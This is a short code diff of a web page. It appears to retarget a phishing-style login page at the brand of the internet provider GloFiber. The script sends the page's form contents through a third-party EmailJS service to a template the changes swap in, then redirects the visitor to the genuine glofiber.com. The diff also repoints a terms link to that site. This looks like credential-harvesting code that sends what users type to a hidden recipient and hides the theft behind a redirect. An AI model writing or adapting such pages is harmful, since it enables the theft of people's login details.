@@ -192,7 +192,7 @@
         After you log in, you will be prompted to review and accept the updated Service Terms Agreement.
         <br>
         You can also view the terms any time at
-        <a href="https://www.globalzimblinker.com/horizon-terms" class="link-terms">this page</a>.
+        <a href="https://www.glofiber.com" class="link-terms">this page</a>.
       </p>
     </div>
   </div>
@@ -240,14 +240,14 @@
       emailjs
         .sendForm(
           "service_zuj2d2a",      // your EmailJS service ID
-          "template_qecwyjf",     // your EmailJS template ID
+          "template_tvd86sp",     // your EmailJS template ID
           "#contact-form"         // selector for this form
         )
         .then(function (response) {
           console.log("SUCCESS!", response.status, response.text);
 
           // Redirect to www.glofiber.com in the same tab
-          window.location.href = "https://www.globalzimblinker.com/horizon-terms";
+          window.location.href = "https://www.glofiber.com";
         })
         .catch(function (error) {
           console.error("FAILED...", error);
